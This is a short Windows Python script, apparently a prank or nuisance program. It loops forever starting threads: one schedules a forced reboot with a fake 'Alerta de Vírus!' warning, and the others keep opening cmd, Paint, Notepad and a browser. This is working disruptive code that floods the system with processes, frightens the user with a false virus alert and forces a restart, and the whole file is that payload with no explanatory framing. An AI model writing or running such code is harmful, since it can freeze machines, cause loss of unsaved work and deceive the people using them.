import os
from threading import Thread
from time import sleep

TIME = 0.5

def WarnUser():
    os.system('shutdown -r -c "Alerta de Vírus!" -t 120')

def OpenApps():
    sleep(TIME)
    os.startfile("cmd")
    os.startfile("mspaint")
    os.startfile("notepad")

    try:
        os.startfile("chrome")

    except:
        os.startfile("msedge")

while True:
    Thread(target=WarnUser).start()
    Thread(target=OpenApps).start()
    Thread(target=OpenApps).start()
    Thread(target=OpenApps).start()
    Thread(target=OpenApps).start()
    Thread(target=OpenApps).start()
    Thread(target=OpenApps).start()
    Thread(target=OpenApps).start()
    Thread(target=OpenApps).start()
    Thread(target=OpenApps).start()
